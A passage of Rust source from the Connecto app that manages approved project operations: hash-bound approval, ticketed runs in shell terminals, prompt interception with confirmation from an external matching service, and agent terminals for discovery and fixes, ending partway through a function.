//! Project operations in the app (ADR 0031): the bridge's `connecto op`, the
//! UI's Operations dialog and tab, and the shell or agent terminals they
//! open. The files and the rules are in `connecto-ops`.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock, PoisonError};
use std::time::{Duration, Instant};

use connecto_core::memory::{ModelChoice, Provider};
use connecto_core::ops::{
    HookMode, OpKind, OpStanding, OpsAction, OpsAnswer, OpsBridge, OpsCaller, OpsControl, OpsExec,
    OpsView, PromptAdvice,
};
use connecto_core::{SessionStatus, ToolKind, WorkspaceControl};
use connecto_ops::{RunFrom, RunRecord, Store, folder, spec};
use connecto_session::Wake;
use connecto_session::launch::Layout;
use connecto_session::utility_run::{UtilityJob, UtilityPurpose, UtilityRunner};
use connecto_workspace::Workspace;

/// How long a view is reused before the folder is read again.
const VIEW_FRESH: Duration = Duration::from_secs(1);
/// `connecto op llm`: its limit, and the models it may use.
const LLM_LIMIT: Duration = Duration::from_secs(120);
const LLM_MODELS: [&str; 2] = ["haiku", "sonnet"];
/// How long a new shell terminal may take to be ready for its line.
const SHELL_READY: Duration = Duration::from_secs(20);
/// How long an intercept's confirmation may wait for its shell: less than
/// the hook waits for the answer (10 s), so a slow shell is refused and the
/// prompt goes to the agent.
const INTERCEPT_READY: Duration = Duration::from_secs(8);

fn now_ms() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| u64::try_from(d.as_millis()).unwrap_or(u64::MAX))
}

fn lock<T>(m: &Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    m.lock().unwrap_or_else(PoisonError::into_inner)
}

/// A run handed to a `connecto` command, until it reports back.
#[derive(Debug, Clone)]
struct Pending {
    project_id: String,
    /// The terminal that ran it: only it reports the end.
    terminal: String,
    slug: String,
    from: RunFrom,
    started_ms: u64,
    timeout_s: u64,
}

/// A run Connecto prepared for a terminal it opened (the dialog's Run, an
/// intercept, a recipe): what was chosen, bound to the files' hash. The
/// terminal claims it with `connecto op run <slug> --ticket <ticket>`; at
/// that moment every condition is checked again.
#[derive(Debug, Clone)]
struct Launch {
    project_id: String,
    slug: String,
    hash: String,
    args: Vec<String>,
    from: RunFrom,
    /// The terminal that may claim it, once known.
    terminal: Option<String>,
    expires_ms: u64,
}

/// How long a prepared run waits for its terminal to claim it.
const LAUNCH_TTL_MS: u64 = 2 * 60 * 1000;

/// An intercept decided for a prompt, waiting for the hook to confirm it
/// has the answer. Nothing runs before that.
#[derive(Debug, Clone)]
struct Hold {
    project_id: String,
    /// The agent terminal whose prompt it is.
    terminal: String,
    slug: String,
    hash: String,
    prompt: String,
    at_ms: u64,
}

/// How long a hold waits for the hook's confirmation, and a prepared
/// shell for its go.
const HOLD_TTL_MS: u64 = 10 * 1000;

/// An intercept the hook confirmed: a shell is open and ready, nothing is
/// typed. The hook prints the block, then says go.
struct Armed {
    project_id: String,
    terminal: String,
    shell: String,
    control: Arc<dyn connecto_core::TerminalsControl>,
    slug: String,
    hash: String,
    prompt: String,
    at_ms: u64,
    armed_ms: u64,
}

/// How often expired holds, prepared shells and lost runs are settled.
const MAINTENANCE: Duration = Duration::from_secs(5);

pub struct OpsHost {
    data_root: PathBuf,
    workspace: OnceLock<Arc<Workspace>>,
    runner: UtilityRunner,
    /// One writer at a time for each project's state.
    writing: Mutex<()>,
    views: Mutex<HashMap<String, (Instant, OpsView)>>,
    /// Projects whose view a worker is rebuilding.
    refreshing: Mutex<std::collections::HashSet<String>>,
    notices: Mutex<HashMap<String, (String, bool)>>,
    pending: Mutex<HashMap<String, Pending>>,
    launches: Mutex<HashMap<String, Launch>>,
    holds: Mutex<HashMap<String, Hold>>,
    armed: Mutex<HashMap<String, Armed>>,
    next_run: AtomicU64,
    /// The Jev key (Settings > Automations), and who asks Jev.
    jev_key: Arc<dyn connecto_automation::KeyStore>,
    asker: Arc<dyn connecto_automation::Asker>,
    /// How long the prompt hook waits for Jev.
    jev_wait: Duration,
    /// This host, for the threads it starts.
    me: OnceLock<std::sync::Weak<OpsHost>>,
}

/// How long the prompt hook waits for Jev before it goes on without it.
const JEV_WAIT: Duration = Duration::from_secs(3);

/// Start the host and give the bridge its half. Call before the workspace
/// starts any terminal; then [`OpsHost::attach`].
pub fn start(
    layout: &Layout,
    wake: &Wake,
    jev_key: Arc<dyn connecto_automation::KeyStore>,
) -> Arc<OpsHost> {
    let host = Arc::new(OpsHost {
        data_root: layout.data_root.clone(),
        workspace: OnceLock::new(),
        runner: UtilityRunner::new(layout.clone(), Arc::clone(wake)),
        writing: Mutex::new(()),
        views: Mutex::new(HashMap::new()),
        refreshing: Mutex::new(std::collections::HashSet::new()),
        notices: Mutex::new(HashMap::new()),
        pending: Mutex::new(HashMap::new()),
        launches: Mutex::new(HashMap::new()),
        holds: Mutex::new(HashMap::new()),
        armed: Mutex::new(HashMap::new()),
        next_run: AtomicU64::new(1),
        jev_key,
        // Each request gives up with the hook's wait, and is not retried.
        asker: Arc::new(connecto_automation::jev::Client::with_limits(
            connecto_automation::jev::DEFAULT_URL,
            JEV_WAIT,
            Duration::ZERO,
        )),
        jev_wait: JEV_WAIT,
        me: OnceLock::new(),
    });
    let _ = host.me.set(Arc::downgrade(&host));
    // Holds, prepared shells and lost runs are settled even when the
    // project gets no more prompts.
    let weak = Arc::downgrade(&host);
    let _ = std::thread::Builder::new()
        .name("ops-maintenance".into())
        .spawn(move || {
            loop {
                std::thread::sleep(MAINTENANCE);
                let Some(host) = weak.upgrade() else {
                    return;
                };
                host.maintain();
            }
        });
    connecto_session::set_ops_bridge(Arc::clone(&host) as Arc<dyn OpsBridge>);
    host
}

impl OpsHost {
    pub fn attach(&self, workspace: &Arc<Workspace>) {
        let _ = self.workspace.set(Arc::clone(workspace));
    }

    /// Stop Everything and closing: `op llm` runs in flight stop.
    pub fn cancel_runs(&self) {
        self.runner.cancel_all();
    }

    fn store(&self, project_id: &str) -> Store {
        Store::new(&self.data_root, project_id)
    }

    /// A project id is the relay's hex id: safe as a folder name.
    fn safe_id(project_id: &str) -> bool {
        (1..=64).contains(&project_id.len()) && project_id.bytes().all(|b| b.is_ascii_hexdigit())
    }

    fn folder_of(&self, project_id: &str) -> Option<PathBuf> {
        let workspace = self.workspace.get()?;
        workspace
            .view()
            .projects
            .iter()
            .find(|p| p.id == project_id && !p.path.is_empty())
            .map(|p| PathBuf::from(&p.path))
    }

    /// The cached view is out of date: the next read rebuilds it (it is
    /// kept meanwhile, so the window does not flicker).
    fn forget_view(&self, project_id: &str) {
        if let Some((at, _)) = lock(&self.views).get_mut(project_id) {
            *at = Instant::now() - VIEW_FRESH;
        }
    }

    fn notice(&self, project_id: &str, text: impl Into<String>, error: bool) {
        lock(&self.notices).insert(project_id.to_owned(), (text.into(), error));
        self.forget_view(project_id);
    }

    fn new_run_id(&self) -> String {
        format!(
            "{:x}-{}",
            now_ms(),
            self.next_run.fetch_add(1, Ordering::SeqCst)
        )
    }

    /// A ticket for a launch or a hold: not guessable from the outside, and
    /// bound to its terminal anyway.
    fn new_ticket(&self) -> String {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.as_nanos());
        let n = self.next_run.fetch_add(1, Ordering::SeqCst);
        let seed = format!("{nanos}:{n}:{}:{:p}", std::process::id(), self);
        folder::hash(seed.as_bytes(), b"ticket")[..24].to_owned()
    }

    /// Prepare a run for a terminal to claim.
    fn reserve(&self, launch: Launch) -> String {
        let ticket = self.new_ticket();
        let now = now_ms();
        let mut all = lock(&self.launches);
        all.retain(|_, l| l.expires_ms > now);
        all.insert(ticket.clone(), launch);
        ticket
    }

    fn jev_present(&self) -> bool {
        self.jev_key
            .get()
            .ok()
            .flatten()
            .is_some_and(|k| !k.trim().is_empty())
    }

    /// The project's state, read under the write lock (a first read
    /// creates it).
    fn state(&self, project_id: &str) -> connecto_ops::State {
        let _guard = lock(&self.writing);
        self.store(project_id).load(now_ms())
    }

    /// Change the project's state: read, changed and saved under one lock,
    /// so no change is lost to another.
    fn update<T>(
        &self,
        project_id: &str,
        change: impl FnOnce(&mut connecto_ops::State) -> Result<T, String>,
    ) -> Result<T, String> {
        let _guard = lock(&self.writing);
        let store = self.store(project_id);
        let mut state = store.load(now_ms());
        let out = change(&mut state)?;
        store.save(&state).map_err(|e| e.to_string())?;
        self.forget_view(project_id);
        Ok(out)
    }

    /// Append to a log under the write lock.
    fn record_run(&self, project_id: &str, record: &RunRecord) -> std::io::Result<()> {
        let _guard = lock(&self.writing);
        let result = self.store(project_id).record_run(record);
        self.forget_view(project_id);
        result
    }

    fn build_view(&self, project_id: &str) -> OpsView {
        let mut view = OpsView {
            project: project_id.to_owned(),
            notice: lock(&self.notices).get(project_id).cloned(),
            ..OpsView::default()
        };
        if !Self::safe_id(project_id) {
            return view;
        }
        let Some(folder) = self.folder_of(project_id) else {
            return view;
        };
        let mut state = self.state(project_id);
        // A discovery terminal that was closed is over. Cleared only if it
        // is still the one checked.
        if let Some(id) = state.discovery_terminal.clone()
            && !self.terminal_open(project_id, &id)
        {
            let _ = self.update(project_id, |s| {
                if s.discovery_terminal.as_deref() == Some(id.as_str()) {
                    s.discovery_terminal = None;
                }
                Ok(())
            });
            state.discovery_terminal = None;
        }
        // The folder is kept out of git once, the first time it is seen.
        if !state.git_excluded
            && matches!(folder::checked_ops_dir(&folder), Ok(Some(_)))
            && folder::exclude_from_git(&folder)
        {
            let _ = self.update(project_id, |s| {
                s.git_excluded = true;
                Ok(())
            });
        }
        let store = self.store(project_id);
        let found = folder::scan(&folder);
        let runs = store.runs(now_ms());
        let prompts = store.prompts();
        let now = now_ms();
        let since = connecto_ops::prompts_since(&state, &prompts);
        view.available = true;
        view.ops = connecto_ops::rows(&found, &state, &runs, &prompts);
        view.hook = state.hook;
        view.weekly = state.weekly;
        view.suggest_discovery = connecto_ops::discovery_due(&state, since, now);
        view.discovery_terminal = state.discovery_terminal.clone();
        view.last_discovery_ms = state.last_discovery_ms;
        view.prompts_since_discovery = since;
        view.jev = self.jev_present();
        view
    }

    fn terminal_open(&self, project_id: &str, id: &str) -> bool {
        self.workspace
            .get()
            .and_then(|w| w.relay(project_id))
            .is_some_and(|relay| {
                relay
                    .terminals()
                    .view()
                    .terminals
                    .iter()
                    .any(|t| t.id == id)
            })
    }

    // ---- the person's actions ------------------------------------------

    fn act(self: &Arc<Self>, project_id: &str, action: OpsAction) -> Result<String, String> {
        if !Self::safe_id(project_id) {
            return Err("Unknown project.".into());
        }
        let folder = self
            .folder_of(project_id)
            .ok_or("Open the local project first.")?;
        match action {
            OpsAction::Approve { slug, hash } => self.approve(project_id, &folder, &slug, &hash),
            OpsAction::Withdraw(slug) => {
                self.update(project_id, |s| {
                    s.approved.remove(&slug);
                    s.intercept.remove(&slug);
                    Ok(())
                })?;
                Ok(format!("{slug} no longer runs until you approve it again."))
            }
            OpsAction::Delete(slug) => {
                folder::delete(&folder, &slug)?;
                self.update(project_id, |s| {
                    s.approved.remove(&slug);
                    s.intercept.remove(&slug);
                    Ok(())
                })?;
                Ok(format!("Deleted {slug}."))
            }
            OpsAction::SetIntercept(slug, on) => {
                if on {
                    let view = self.build_view(project_id);
                    let row = view
                        .ops
                        .iter()
                        .find(|r| r.slug == slug)
                        .ok_or_else(|| format!("There is no operation {slug}."))?;
                    if !row.can_intercept() {
                        return Err(format!(
                            "{slug} cannot run in place of a prompt: only an approved script that does not ask first can."
                        ));
                    }
                }
                self.update(project_id, |s| {
                    if on {
                        s.intercept.insert(slug.clone());
                    } else {
                        s.intercept.remove(&slug);
                    }
                    Ok(())
                })?;
                Ok(if on {
                    format!("{slug} now runs in place of a matching prompt to Claude.")
                } else {
                    format!("{slug} is only suggested to the agent.")
                })
            }
            OpsAction::Run { slug, hash, args } => {
                self.run_from_dialog(project_id, &folder, &slug, &hash, &args)
            }
            OpsAction::Fix(slug) => self.fix(project_id, &slug),
            OpsAction::Discover => self.discover(project_id, &folder),
            OpsAction::Later => {
                self.update(project_id, |s| {
                    s.later_until_ms = Some(now_ms() + connecto_ops::LATER_MS);
                    Ok(())
                })?;
                Ok("Suggested again in three days.".into())
            }
            OpsAction::SetHook(mode) => {
                self.update(project_id, |s| {
                    s.hook = mode;
                    Ok(())
                })?;
                Ok(match mode {
                    HookMode::Off => "Agents are no longer told about matching operations.".into(),
                    HookMode::Suggest => {
                        "Agents are told when a prompt matches an operation.".into()
                    }
                })
            }
            OpsAction::SetWeekly(on) => {
                self.update(project_id, |s| {
                    s.weekly = on;
                    Ok(())
                })?;
                Ok(if on {
                    "Connecto will suggest looking for operations every week.".into()
                } else {
                    "No weekly suggestion.".into()
                })
            }
        }
    }

    /// Whether an approved operation may run in place of a prompt (spec
    /// §6): the person switched it on, the hook is on, it does not ask
    /// first, it is a script with no required argument, and this system
    /// can run it. Checked when the intercept is decided, confirmed and
    /// claimed.
    fn may_intercept(
        state: &connecto_ops::State,
        slug: &str,
        loaded: &connecto_ops::Loaded,
    ) -> bool {
        cfg!(unix)
            && state.hook == HookMode::Suggest
            && state.intercept.contains(slug)
            && state.approved.get(slug) == Some(&loaded.hash)
            && !loaded.spec.asks_first()
            && loaded.spec.kind != OpKind::Recipe
            && loaded.spec.args.iter().all(|a| !a.required)
    }

    /// Which approved operation a prompt asks for (spec §6): the local
    /// match first; then Jev about its candidates, when the key is set; and
    /// an intercept only where the person allowed it and every condition
    /// holds. Returns the outcome and, for an intercept, the hash decided on.
    fn match_prompt(
        &self,
        caller: &OpsCaller,
        state: &connecto_ops::State,
        prompt: &str,
    ) -> (connecto_ops::PromptOutcome, Option<String>) {
        use connecto_ops::PromptOutcome;
        use connecto_ops::confirm::{self, Verdict};
        // The cheap refusals first: no folder is read for them.
        if state.approved.is_empty()
            || connecto_ops::matcher::word_count(prompt) > connecto_ops::matcher::MAX_PROMPT_WORDS
        {
            return (PromptOutcome::None, None);
        }
        let approved: Vec<(String, connecto_ops::Loaded)> = folder::scan(&caller.folder)
            .into_iter()
            .filter(|f| connecto_ops::standing(f, state).runs())
            .filter_map(|f| f.loaded.ok().map(|l| (f.slug, l)))
            .collect();
        let phrases: Vec<(String, Vec<String>)> = approved
            .iter()
            .map(|(slug, l)| (slug.clone(), l.spec.phrases.clone()))
            .collect();
        let candidates = connecto_ops::matcher::candidates(prompt, &phrases);
        let Some(best) = candidates.first() else {
            return (PromptOutcome::None, None);
        };
        let Some(key) = self
            .jev_key
            .get()
            .ok()
            .flatten()
            .filter(|k| !k.trim().is_empty())
        else {
            // Without Jev, only a strong local match is suggested.
            let outcome = if best.score >= connecto_ops::matcher::SUGGEST_ALONE {
                PromptOutcome::Suggested(best.slug.clone())
            } else {
                PromptOutcome::None
            };
            return (outcome, None);
        };
        let asked: Vec<confirm::Candidate> = candidates
            .iter()
            .filter_map(|c| approved.iter().find(|(slug, _)| *slug == c.slug))
            .map(|(slug, l)| confirm::Candidate {
                slug: slug.clone(),
                name: l.spec.name.clone(),
                description: l.spec.description.clone(),
                phrases: l.spec.phrases.clone(),
            })
            .collect();
        let (questions, names) = confirm::question(&asked);
        let (tx, rx) = std::sync::mpsc::sync_channel(1);
        let asker = Arc::clone(&self.asker);
        let text = prompt.to_owned();
        let spawned = std::thread::Builder::new()
            .name("ops-jev".into())
            .spawn(move || {
                let exchange = asker.ask(&key, confirm::JEV_MODEL, &text, &questions);
                let _ = tx.send(exchange.result);
            });
        // With Jev set up, no answer means no advice: the local match alone
        // is for a project without Jev.
        let verdict = match spawned.ok().map(|_| rx.recv_timeout(self.jev_wait)) {
            Some(Ok(Ok(response))) => match response.answer(confirm::QUESTION).cloned() {
                Some(connecto_automation::jev::Answer::Choice { choice, confidence }) => {
                    confirm::verdict(&choice, confidence, &names)
                }
                _ => Verdict::Unknown,
            },
            _ => Verdict::Unknown,
        };
        match verdict {
            Verdict::Picked(slug, confidence) if confidence >= confirm::SUGGEST => {
                let loaded = approved.iter().find(|(s, _)| *s == slug).map(|(_, l)| l);
                let intercept = confidence >= confirm::INTERCEPT
                    && caller.tool == ToolKind::Claude
                    && connecto_ops::matcher::word_count(prompt)
                        <= connecto_ops::matcher::INTERCEPT_MAX_WORDS
                    && loaded.is_some_and(|l| Self::may_intercept(state, &slug, l));
                if intercept {
                    let hash = loaded.map(|l| l.hash.clone());
                    (PromptOutcome::Intercepted(slug), hash)
                } else {
                    (PromptOutcome::Suggested(slug), None)
                }
            }
            _ => (PromptOutcome::None, None),
        }
    }

    /// The hook has the intercept answer and asks for the operation to run
    /// (`connecto op intercept <ticket>`). Everything is checked again; on
    /// any refusal the hook prints nothing and the prompt goes to the agent.
    fn confirm_intercept(&self, caller: &OpsCaller, args: &[String]) -> OpsAnswer {
        let [ticket] = args else {
            return refused("bad_request", "`op intercept` is for the prompt hook.");
        };
        let now = now_ms();
        let hold = {
            let mut holds = lock(&self.holds);
            match holds.get(ticket) {
                Some(h) if h.terminal == caller.terminal && h.project_id == caller.project_id => {
                    holds.remove(ticket)
                }
                _ => None,
            }
        };
        let Some(hold) = hold else {
            return refused("not_found", "No such intercept.");
        };
        let record = |outcome: connecto_ops::PromptOutcome| {
            self.record_prompt(
                &hold.project_id,
                &hold.terminal,
                &hold.prompt,
                hold.at_ms,
                outcome,
            );
        };
        let allowed = now.saturating_sub(hold.at_ms) <= HOLD_TTL_MS
            && folder::load(&caller.folder, &hold.slug).is_ok_and(|loaded| {
                loaded.hash == hold.hash
                    && Self::may_intercept(&self.state(&caller.project_id), &hold.slug, &loaded)
            });
        if !allowed {
            record(connecto_ops::PromptOutcome::None);
            return refused(
                "changed",
                "The operation can no longer run in place of the prompt.",
            );
        }
        if cfg!(not(unix)) {
            record(connecto_ops::PromptOutcome::None);
            return refused("not_available", "Operation scripts need /bin/bash.");
        }
        // A shell, open and ready; nothing is typed until go.
        let prepared = self
            .open_shell(&hold.project_id, &format!("op {}", hold.slug))
            .and_then(|(shell, control)| {
                Self::wait_ready(&*control, &shell, INTERCEPT_READY).map(|()| (shell, control))
            });
        match prepared {
            Ok((shell, control)) => {
                lock(&self.armed).insert(
                    ticket.clone(),
                    Armed {
                        project_id: hold.project_id,
                        terminal: hold.terminal,
                        shell,
                        control,
                        slug: hold.slug,
                        hash: hold.hash,
                        prompt: hold.prompt,
                        at_ms: hold.at_ms,
                        armed_ms: now_ms(),
                    },
                );
                OpsAnswer::Text(String::new())
            }
            Err(why) => {
                record(connecto_ops::PromptOutcome::None);
                refused("not_started", &why)
            }
        }
    }

    /// The hook printed the block (`connecto op go <ticket>`): type the run
    /// into the prepared shell. Answered at once, before typing, so the hook
    /// never waits on the shell. The run is claimed with its own ticket, and
    /// checked again then.
    fn go(&self, caller: &OpsCaller, args: &[String]) -> OpsAnswer {
        let [ticket] = args else {
            return refused("bad_request", "`op go` is for the prompt hook.");
        };
        let armed = {
            let mut all = lock(&self.armed);
            match all.get(ticket) {
                Some(a) if a.terminal == caller.terminal && a.project_id == caller.project_id => {
                    all.remove(ticket)
                }
                _ => None,
            }
        };
        let Some(armed) = armed else {
            return refused("not_found", "No such intercept.");
        };
        match self.me.get().and_then(std::sync::Weak::upgrade) {
            Some(host) => {
                let spawned = std::thread::Builder::new()
                    .name("ops-intercept".into())
                    .spawn(move || host.start_armed(armed));
                if spawned.is_err() {
                    return refused("not_started", "Could not start the operation.");
                }
            }
            // Tests hold the host without an Arc: type in place.
            None => self.start_armed(armed),
        }
        OpsAnswer::Text(String::new())
    }

    /// Type an armed intercept's run into its shell, or say it did not start.
    fn start_armed(&self, armed: Armed) {
        let launch = Launch {
            project_id: armed.project_id.clone(),
            slug: armed.slug.clone(),
            hash: armed.hash.clone(),
            args: Vec::new(),
            from: RunFrom::Intercept,
            terminal: Some(armed.shell.clone()),
            expires_ms: now_ms() + LAUNCH_TTL_MS,
        };
        let claim = self.reserve(launch);
        let line = format!("connecto op run {} --ticket {claim}", armed.slug);
        match Self::type_line(&*armed.control, &armed.shell, &line) {
            Ok(()) => self.record_prompt(
                &armed.project_id,
                &armed.terminal,
                &armed.prompt,
                armed.at_ms,
                connecto_ops::PromptOutcome::Intercepted(armed.slug),
            ),
            Err(why) => {
                lock(&self.launches).remove(&claim);
                self.not_started(&armed, &why);
            }
        }
    }

    /// An intercepted operation did not start. Connecto cannot tell from
    /// here whether Claude took the block (the hook may have stopped before
    /// printing it, or Claude may have dropped it), so the notice says only
    /// what is known, and logs the prompt as not run.
    fn not_started(&self, armed: &Armed, why: &str) {
        self.notice(
            &armed.project_id,
            format!(
                "`{}` did not start for a prompt in {} ({why}). Check that terminal before asking again: the agent may have the prompt.",
                armed.slug, armed.terminal
            ),
            true,
        );
        self.record_prompt(
            &armed.project_id,
            &armed.terminal,
            &armed.prompt,
            armed.at_ms,
            connecto_ops::PromptOutcome::None,
        );
    }

    /// Settle what timed out: holds never confirmed (their prompts went to
    /// the agent), prepared shells never told to go (nothing ran; the
    /// prompt may or may not have reached the agent), and runs that never
    /// reported.
    fn maintain(&self) {
        self.expire_holds();
        let now = now_ms();
        let stale: Vec<Armed> = {
            let mut all = lock(&self.armed);
            let old: Vec<String> = all
                .iter()
                .filter(|(_, a)| now.saturating_sub(a.armed_ms) > HOLD_TTL_MS)
                .map(|(t, _)| t.clone())
                .collect();
            old.into_iter().filter_map(|t| all.remove(&t)).collect()
        };
        for armed in stale {
            self.not_started(&armed, "the prompt hook did not finish");
        }
        lock(&self.launches).retain(|_, l| l.expires_ms > now);
        lock(&self.pending)
            .retain(|_, p| now.saturating_sub(p.started_ms) <= (p.timeout_s + 300) * 1000);
    }

    /// Keep a person's prompt, from a thread: the hook never waits on the
    /// log.
    fn record_prompt(
        &self,
        project_id: &str,
        terminal: &str,
        prompt: &str,
        at_ms: u64,
        outcome: connecto_ops::PromptOutcome,
    ) {
        let record = connecto_ops::PromptRecord {
            at_ms,
            terminal: terminal.to_owned(),
            text: prompt.to_owned(),
            outcome,
        };
        let Some(host) = self.me.get().and_then(std::sync::Weak::upgrade) else {
            // Not started as the app's host (a test): kept at once.
            let _guard = lock(&self.writing);
            let _ = self.store(project_id).record_prompt(&record);
            return;
        };
        let project = project_id.to_owned();
        let _ = std::thread::Builder::new()
            .name("ops-prompt".into())
            .spawn(move || {
                let _guard = lock(&host.writing);
                let _ = host.store(&project).record_prompt(&record);
                drop(_guard);
                host.forget_view(&project);
            });
    }

    /// Holds the hook never confirmed: their prompts went to the agent.
    fn expire_holds(&self) {
        let now = now_ms();
        let expired: Vec<Hold> = {
            let mut holds = lock(&self.holds);
            let old: Vec<String> = holds
                .iter()
                .filter(|(_, h)| now.saturating_sub(h.at_ms) > HOLD_TTL_MS)
                .map(|(t, _)| t.clone())
                .collect();
            old.into_iter().filter_map(|t| holds.remove(&t)).collect()
        };
        for h in expired {
            self.record_prompt(
                &h.project_id,
                &h.terminal,
                &h.prompt,
                h.at_ms,
                connecto_ops::PromptOutcome::None,
            );
        }
    }

    /// Approve the files the person was shown, and only those.
    fn approve(
        &self,
        project_id: &str,
        folder: &Path,
        slug: &str,
        hash: &str,
    ) -> Result<String, String> {
        let loaded = folder::load(folder, slug)?;
        if loaded.hash != hash {
            return Err(format!(
                "{slug} changed since it was shown. Read it again before you approve it."
            ));
        }
        self.update(project_id, |s| {
            s.approved.insert(slug.to_owned(), hash.to_owned());
            Ok(())
        })?;
        Ok(format!("Approved {slug}."))
    }

    fn run_from_dialog(
        self: &Arc<Self>,
        project_id: &str,
        folder: &Path,
        slug: &str,
        hash: &str,
        args: &[String],
    ) -> Result<String, String> {
        let loaded = folder::load(folder, slug)?;
        if loaded.hash != hash {
            return Err(format!(
                "{slug} changed since it was shown, so it was not run. Look at it again."
            ));
        }
        let state = self.state(project_id);
        if state.approved.get(slug).map(String::as_str) != Some(hash) {
            return Err(format!("Approve {slug} before running it."));
        }
        if args.len() > loaded.spec.args.len() {
            return Err(format!(
                "{slug} takes at most {} arguments.",
                loaded.spec.args.len()
            ));
        }
        let launch = Launch {
            project_id: project_id.to_owned(),
            slug: slug.to_owned(),
            hash: hash.to_owned(),
            args: args.to_vec(),
            from: RunFrom::Dialog,
            terminal: None,
            expires_ms: now_ms() + LAUNCH_TTL_MS,
        };
        if loaded.spec.kind == OpKind::Recipe {
            let ticket = self.reserve(launch);
            let prompt = format!(
                "Run the project operation `{slug}`: it is a recipe. Run `connecto op run {slug} --ticket {ticket}` to read its steps and the arguments the user gave, then follow them."
            );
            let name = format!("op {slug}");
            let opened = self.open_task_agent(project_id, &name, &prompt);
            let id = match opened {
                Ok(id) => id,
                Err(err) => {
                    lock(&self.launches).remove(&ticket);
                    return Err(err);
                }
            };
            if let Some(l) = lock(&self.launches).get_mut(&ticket) {
                l.terminal = Some(id.clone());
            }
            return Ok(format!("{slug} is running in {id}."));
        }
        let id = self.launch_in_shell(launch)?;
        Ok(format!("{slug} is running in {id}."))
    }

    /// Open a shell terminal for `launch`, bind the launch to it, and type
    /// the claim from a thread once the shell is ready. The launch's own
    /// checks run when the terminal claims it.
    fn launch_in_shell(&self, mut launch: Launch) -> Result<String, String> {
        if cfg!(not(unix)) {
            return Err(
                "Operation scripts need /bin/bash, which this system does not have.".into(),
            );
        }
        let slug = launch.slug.clone();
        let project_id = launch.project_id.clone();
        let (id, control) = self.open_shell(&project_id, &format!("op {slug}"))?;
        launch.terminal = Some(id.clone());
        let ticket = self.reserve(launch);
        let line = format!("connecto op run {slug} --ticket {ticket}");
        self.type_when_ready(&project_id, control, &id, line);
        Ok(id)
    }

    /// The person's prompts in this project: the hook's log, and the
    /// closed terminals' own logs (only messages recognised as typed by a
    /// person), from the last 90 days.
    fn asked(&self, project_id: &str) -> Vec<connecto_ops::discovery::Asked> {
        const WINDOW_MS: u64 = 90 * 24 * 60 * 60 * 1000;
        let since = now_ms().saturating_sub(WINDOW_MS);
        let mut asked: Vec<connecto_ops::discovery::Asked> = self
            .store(project_id)
            .prompts()
            .into_iter()
            .filter(|p| p.at_ms >= since)
            .map(|p| connecto_ops::discovery::Asked {
                at_ms: p.at_ms,
                text: p.text,
            })
            .collect();
        let logged = crate::memory_host::past_conversations(&self.data_root, project_id, since)
            .unwrap_or_default();
        for conversation in logged.conversations {
            for turn in conversation.turns {
                if turn.role == connecto_memory::host::TurnRole::User
                    && connecto_ops::state::is_persons_prompt(&turn.text)
                {
                    asked.push(connecto_ops::discovery::Asked {
                        at_ms: turn.at_ms.unwrap_or(conversation.ended_ms),
                        text: turn.text,
                    });
                }
            }
        }
        asked
    }

    /// Open the discovery terminal (spec §8): the digest first, then a
    /// Claude terminal (Codex when Claude cannot start) with the goal.
    fn discover(self: &Arc<Self>, project_id: &str, folder: &Path) -> Result<String, String> {
        if let Some(id) = self.state(project_id).discovery_terminal
            && self.terminal_open(project_id, &id)
        {
            return Err(format!("It is already running in {id}."));
        }
        let digest = connecto_ops::discovery::digest(&self.asked(project_id), now_ms());
        let path = connecto_ops::discovery::write_digest(folder, &digest)
            .map_err(|e| format!("Cannot write the digest: {e}"))?;
        let shown = path
            .strip_prefix(folder)
            .map_or_else(|_| path.clone(), Path::to_path_buf);
        let existing: Vec<String> = folder::scan(folder).into_iter().map(|f| f.slug).collect();
        let goal = connecto_ops::discovery::goal(&existing, &shown.to_string_lossy());
        let id = self.open_task_agent(project_id, "Find operations", &goal)?;
        self.update(project_id, |s| {
            s.last_discovery_ms = Some(now_ms());
            s.later_until_ms = None;
            s.discovery_terminal = Some(id.clone());
            Ok(())
        })?;
        Ok(format!(
            "Looking for operations in {id}. Its proposals show here when it is done."
        ))
    }

    fn fix(self: &Arc<Self>, project_id: &str, slug: &str) -> Result<String, String> {
        if !spec::valid_slug(slug) {
            return Err("Unknown operation.".into());
        }
        let last = self
            .store(project_id)
            .runs(now_ms())
            .into_iter()
            .rev()
            .find(|r| r.slug == slug)
            .map_or_else(|| "no run recorded".to_owned(), |r| r.outcome);
        let prompt = format!(
            "The project operation `{slug}` (in .connecto/ops/{slug}/) did not work: its last run ended with \"{last}\". Run `connecto op show {slug}`, find out why (its terminal may still show the output), and fix its files. Keep its op.json valid (see docs in `connecto op show`). After your change the user has to approve it again in Connecto; tell them so."
        );
        let id = self.open_task_agent(project_id, &format!("fix op {slug}"), &prompt)?;
        Ok(format!("An agent is looking at {slug} in {id}."))
    }

    /// A new agent terminal for a task of Connecto's (a recipe, discovery,
    /// a fix), on the first CLI the project's Tools setting allows that
    /// opens: Claude first, as before, then the others in their order.
    fn open_task_agent(
        &self,
        project_id: &str,
        name: &str,
        prompt: &str,
    ) -> Result<String, String> {
        let allowed = connecto_session::project_settings::load(&self.data_root, project_id).tools;
        first_that_opens(allowed, |tool| {
            self.open_agent(project_id, tool, name, prompt.to_owned())
        })
    }

    /// A new agent terminal in the project, with `prompt` as its first
    /// message, shown.
    fn open_agent(
        &self,
        project_id: &str,
        tool: ToolKind,
        name: &str,
        prompt: String,
    ) -> Result<String, String> {
        let workspace = self.workspace.get().ok_or("Connecto is starting.")?;
        if workspace.pause_switch().is_paused() {
            return Err("Resume Connecto first.".into());
        }
        let relay = workspace
            .relay(project_id)
            .ok_or("Open the project first.")?;
        let name: String = name.chars().take(connecto_core::MAX_NAME_CHARS).collect();
        // Marked as Connecto's, so the prompt log never counts it as the
        // person's.
        let prompt = format!("[connecto task] {prompt}");
        let id = relay
            .terminals()
            .add_with(tool, Some(name), Some(prompt), None, None)?;
        workspace.activate(project_id);
        workspace.set_active_terminal(project_id, &id);
        Ok(id)
    }

    /// A new shell terminal in the project, shown.
    fn open_shell(
        &self,
        project_id: &str,
        name: &str,
    ) -> Result<(String, Arc<dyn connecto_core::TerminalsControl>), String> {
